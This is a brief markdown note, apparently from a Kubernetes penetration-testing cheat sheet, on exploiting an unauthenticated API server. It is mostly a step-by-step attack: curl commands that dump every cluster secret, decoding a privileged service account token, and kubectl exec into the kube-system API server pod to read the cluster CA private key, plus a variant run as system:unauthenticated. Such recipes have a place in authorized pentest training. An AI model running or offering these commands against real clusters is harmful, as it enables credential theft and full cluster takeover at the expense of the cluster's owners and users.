## Unauthenticated API Server


1. A couple of ways to exploit this, the easiest would be to use kubectl but we can also use curl.
2. using curl
 - Dump out secrets using `curl https://[IP]:6443/api/v1/secrets 
 - Find the token for a service account which can exec inside pods (clusterrole-aggregation-controller is the best target)
 - Base64 decode the token
 - kubectl --insecure-skip-tls-verify -shttps://[IP]:6443/ --token="[DECODED_TOKEN]" get po -n kube-system
 - kubectl --insecure-skip-tls-verify -shttps://[IP]:6443/ --token="[DECODED_TOKEN]" -n kube-system exec [API_SERVER_PORT] cat /etc/kubernetes/pki/ca.key
 - Profit! 
3. Another Options is to use kubectl
 - kubectl --insecure-skip-tls-verify --username=system:unauthenticated -shttps://[IP]:6443 get po -n kube-system
 - kubectl --insecure-skip-tls-verify --username=system:unauthenticated -shttps://[IP]:6443 -n kube-system exec [APISERVERPOD] cat /etc/kubernetes/pki/ca.key